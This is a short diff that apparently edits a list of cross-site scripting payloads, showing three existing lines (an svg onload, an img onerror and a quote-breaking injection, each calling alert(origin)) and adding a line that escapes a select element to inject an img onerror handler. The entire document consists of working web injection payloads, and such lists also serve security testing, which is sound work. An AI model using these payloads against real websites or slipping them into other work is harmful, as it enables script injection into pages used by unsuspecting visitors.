@@ -2,3 +2,4 @@
 "><svg onload=alert(origin)>
 <img src=1 onerror=alert(origin)>
 '-alert(origin)-'
+"></select><img%20src=1%20onerror=alert(origin)>
